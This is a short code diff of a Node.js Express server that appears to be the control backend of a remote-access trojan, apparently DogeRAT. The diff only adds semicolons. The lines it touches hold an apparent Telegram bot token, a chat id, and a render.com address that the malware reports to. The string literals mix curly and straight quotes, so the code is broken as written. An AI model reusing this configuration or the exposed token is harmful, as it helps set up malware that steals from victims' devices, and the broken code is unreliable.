@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = ‘8292920038:AAGSBRCvAW3z9vo9cyXpQn0uAIdp0ZV_rnI'
-const id = ‘6150388959'
+const token = ‘8292920038:AAGSBRCvAW3z9vo9cyXpQn0uAIdp0ZV_rnI';
+const id = ‘6150388959';
 const address = 'https://dogerat-fknb.onrender.com'
 const app = express();
 const appServer = http.createServer(app);
